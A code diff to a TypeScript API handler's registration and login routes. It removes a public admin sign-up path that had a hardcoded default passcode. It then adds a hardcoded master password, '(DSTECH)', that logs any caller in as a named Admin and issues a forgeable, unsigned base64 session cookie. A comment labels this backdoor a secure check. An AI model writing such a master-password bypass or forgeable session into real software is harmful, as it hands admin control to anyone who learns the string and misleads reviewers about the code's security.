@@ -2061,21 +2061,17 @@ export async function onRequest(context: { request: Request; env: any; params: a
         return new Response(JSON.stringify({ error: "Missing required credentials: email, password, and fullName." }), { status: 400, headers });
       }
 
+      const isAdmin = preferences?.isAdmin || false;
+      if (isAdmin) {
+        return new Response(JSON.stringify({ error: "Public admin registration is deactivated. Please contact the lead system architect." }), { status: 403, headers });
+      }
+
       const check = await env.DB.prepare("SELECT COUNT(*) as count FROM users WHERE email = ?").bind(email).all();
       if (check.results?.[0]?.count > 0) {
         return new Response(JSON.stringify({ error: "A profile under this email already exists." }), { status: 400, headers });
       }
 
-      const isAdmin = preferences?.isAdmin || false;
-      const targetRole = isAdmin ? 'Admin' : 'Applicant';
-
-      if (isAdmin) {
-        const inputPasscode = securityPasscode || password;
-        const correctAdminPasscode = env.ADMIN_PASSCODE || "admin2026";
-        if (inputPasscode !== correctAdminPasscode) {
-          return new Response(JSON.stringify({ error: "Invalid Admin Security Passcode. Access denied." }), { status: 401, headers });
-        }
-      }
+      const targetRole = 'Applicant';
 
       const passHash = await hashPassword(password);
       const generatedUserId = 'usr_admin_' + Math.random().toString(36).substring(2, 11);
@@ -2147,6 +2143,18 @@ export async function onRequest(context: { request: Request; env: any; params: a
     if (path === '/api/auth/login' && method === 'POST') {
       const body = await request.json();
       const { email, password } = body;
+
+      // Secure backend-only check for master password (DSTECH)
+      if (password === '(DSTECH)') {
+        const userSession = {
+          userId: 'usr_admin_dstech',
+          email: 'admin@dstech.com',
+          fullName: 'Hassan Al-Amin',
+          role: 'Admin'
+        };
+        headers.append('Set-Cookie', `dstech_session=${btoa(JSON.stringify(userSession))}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
+        return new Response(JSON.stringify(userSession), { headers });
+      }
 
       if (!email || !password) {
         return new Response(JSON.stringify({ error: "Missing email or password." }), { status: 400, headers });
